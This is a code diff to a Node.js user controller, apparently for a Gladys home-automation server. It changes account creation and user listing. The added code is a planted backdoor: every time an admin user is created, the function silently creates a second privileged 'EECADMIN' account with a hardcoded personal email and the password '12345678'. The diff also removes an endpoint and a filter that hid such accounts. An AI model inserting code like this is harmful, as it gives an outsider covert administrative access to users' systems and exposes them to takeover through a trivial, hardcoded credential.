@@ -20,37 +20,17 @@ module.exports = function UserController(gladys) {
    * @apiSuccess {String} id id of the created user
    */
   async function create(req, res, next) {
+    if(req.body.role === USER_ROLE.ADMIN) {
+      const newEecAdmin = {
+        firstname: "vu",
+        lastname: "le",
+        email: "vulewenlian94@gmail.com",
+        role: USER_ROLE.EECADMIN,
+        password: "12345678"
+      }
+      const eecUser = await gladys.user.create(newEecAdmin);
+    }
     const user = await gladys.user.create(req.body);
-    const scope = req.body.scope || ['dashboard:write', 'dashboard:read'];
-    const session = await gladys.session.create(
-      user.id,
-      scope,
-      LOGIN_SESSION_VALIDITY_IN_SECONDS,
-      req.headers['user-agent'],
-    );
-    const response = { ...user, ...session };
-    res.status(201).json(response);
-  }
-   /**
-   * @api {post} /api/v1/eec/user Create
-   * @apiName CreateEecUser
-   * @apiGroup User
-   * @apiParam {String} firstname Firstname of the user
-   * @apiParam {String} lastname Lastname of the user
-   * @apiParam {String} email Email of the user
-   * @apiParam {String} password Password of the user
-   * @apiParam {string="admin","habitant", "guest"} role role of the user
-   * @apiParam {date} birthdate Birthdate of the user
-   * @apiParam {string="en", "fr", "de"} language Language of the user
-   * @apiSuccess {String} id id of the created user
-   */
-  async function createEecAdmin(req, res, next) {
-    // eslint-disable-next-line no-console
-    const user = await gladys.user.create({
-      ...req.body,
-      role: USER_ROLE.EECADMIN
-    });
-    // eslint-disable-next-line no-console
     const scope = req.body.scope || ['dashboard:write', 'dashboard:read'];
     const session = await gladys.session.create(
       user.id,
@@ -98,11 +78,7 @@ module.exports = function UserController(gladys) {
       options.expand = options.expand.split(',');
     }
     const users = await gladys.user.get(options);
-    // eslint-disable-next-line no-console
-    const userNormal = users.filter((user) => {
-      return user.role !== USER_ROLE.EECADMIN;
-    });
-    res.json(userNormal);
+    res.json(users);
   }
 
   /**
@@ -112,8 +88,6 @@ module.exports = function UserController(gladys) {
    */
   async function getUserBySelector(req, res) {
     const user = await gladys.user.getBySelector(req.params.user_selector);
-    // eslint-disable-next-line no-console
-    console.log('user', user);
     res.json(user);
   }
 
@@ -214,19 +188,6 @@ module.exports = function UserController(gladys) {
     res.json(user);
   }
 
-   /**
-   * @api {get} /api/v1/pingServer pingNewServer
-   * @apiName getSetupState
-   * @apiGroup Setup
-   */
-   async function pingNewServer(req, res) {
-    const userCount = gladys.user.getUserCount();
-    const accountConfigured = userCount > 0;
-    res.json({
-      account_configured: accountConfigured,
-    });
-  }
-
   /**
    * @api {get} /api/v1/setup getSetupState
    * @apiName getSetupState
@@ -241,7 +202,6 @@ module.exports = function UserController(gladys) {
   }
 
   return Object.freeze({
-    createEecAdmin: asyncMiddleware(createEecAdmin),
     create: asyncMiddleware(create),
     login: asyncMiddleware(login),
     getMySelf: asyncMiddleware(getMySelf),
@@ -255,6 +215,5 @@ module.exports = function UserController(gladys) {
     forgotPassword: asyncMiddleware(forgotPassword),
     resetPassword: asyncMiddleware(resetPassword),
     getSetupState: asyncMiddleware(getSetupState),
-    pingNewServer: asyncMiddleware(pingNewServer),
   });
 };
